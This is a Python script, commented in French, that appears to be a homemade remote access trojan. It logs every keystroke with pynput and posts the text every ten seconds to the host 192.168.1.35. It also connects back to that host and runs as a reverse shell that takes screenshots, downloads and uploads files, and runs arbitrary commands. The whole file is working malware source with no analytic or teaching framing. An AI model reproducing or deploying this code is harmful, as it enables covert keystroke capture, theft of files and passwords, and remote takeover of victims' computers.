#!/usr/bin/python3

import socket
import subprocess
import time
import os
import sys
import shutil
import platform
from pynput import keyboard
import pyautogui #la bib de screenshots
import io
import requests
import json
import threading


time_interval = 10
text = ""
#la fonction qui vas envoyer la resultat des commande executer 
def sending(command):
    try:
        json_data = json.dumps(command)
        s.send(json_data.encode())
    except Exception as e:
        print(f"Error sending data: {e}")

#la fonction qui vas recever les commande a executer 
def receive():
    json_data = ""
    while True:
        try:
            chunk = s.recv(4096).decode()
            if not chunk:
                break
            json_data += chunk
            return json.loads(json_data)
        except json.JSONDecodeError:
            continue
        except Exception:
            print(f"Error receiving data: {s}")
            break

def send_post_req():
    try:
        payload = json.dumps({"keyboardData" : text})
        r = requests.post(f"http://192.168.1.35:443", data=payload, headers={"Content-Type" : "application/json"})
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()
    except:
        print("Couldn't complete request!")
        
        

def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")     
        
        
with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()  # Envoie les données toutes les 10 secondes
    listener.join()           

#la fonction qui vas etablire la connectiviter
def connection():
    global s
    while True:
        time.sleep(20)
        try:
            s.connect(("192.168.1.35", 443))
            shell()
            break  # Exit loop after successful shell session
        except socket.error as e:
            print(f"Connection error: {e}")
            continue  # Retry after sleep interval

def shell():
    while True:
        try:
            command = receive()
            if command is None:
                print("Connection closed by the server.")
                break
            
                #taritemment de la commande quiter le shell
            if command.lower() in ["exit", "quit"]:
                print("Command received to end connection.")
                break
            
                #taritemment de la commande changer l'emplacemment
            elif command.startswith("cd "):  # Gérer la commande 'cd'
                try:
                    os.chdir(command[3:])
                    # Envoyer le nouveau répertoire au serveur
                    sending(f"Changed directory to {os.getcwd()}")
                except FileNotFoundError:
                    sending("Directory not found.")
                except Exception as e:
                    sending(f"Error changing directory: {str(e)}")
                continue
            
                #afficher l'emplacemment 
            elif command.strip() == "cd":  # Si l'utilisateur veut vérifier le répertoire
                sending(os.getcwd())
                continue
            
            #traitemment de la commande capture 
            elif command.strip() == "screenshot":
                try:
                    screenshot = pyautogui.screenshot()
                    buffer = io.BytesIO()
                    screenshot.save(buffer, format="PNG")
                    buffer.seek(0)
                    sending({"status": "success", "data": buffer.getvalue().hex()})
                except Exception as e:
                    sending({"status": "error", "message": str(e)})
                    continue
                
              #traitemment de la commande dowload  
            elif command.startswith("download "):
                try:
                    filepath = command[9:].strip()
                    with open(filepath, "rb") as f:
                        sending({"status": "success", "data": f.read().hex()})
                except FileNotFoundError:
                    sending({"status": "error", "message": "File not found"})
                except Exception as e:
                    sending({"status": "error", "message": str(e)})
                continue
            
            #traitemment de la commande upload
            elif command.startswith("upload "):
                try:
                    filepath, filedata = command.split(" ", 2)
                    with open(filepath, "wb") as f:
                        f.write(bytes.fromhex(filedata))
                    sending(f"File {filepath} uploaded successfully.")
                except Exception as e:
                    sending(f"Error uploading file: {str(e)}")
                continue

    

            # Exécuter toutes les autres commandes
            proc = subprocess.Popen(
                command, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
            )
            result = proc.stdout.read() + proc.stderr.read()
            sending(result.decode('utf-8', errors='replace'))

        except socket.error as e:
            print(f"Socket error: {e}")
            break
        except Exception as e:
            print(f"General error: {e}")
            sending(f"Error: {str(e)}")

    print("Exiting shell...")





s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connection()
finally:
    s.close()
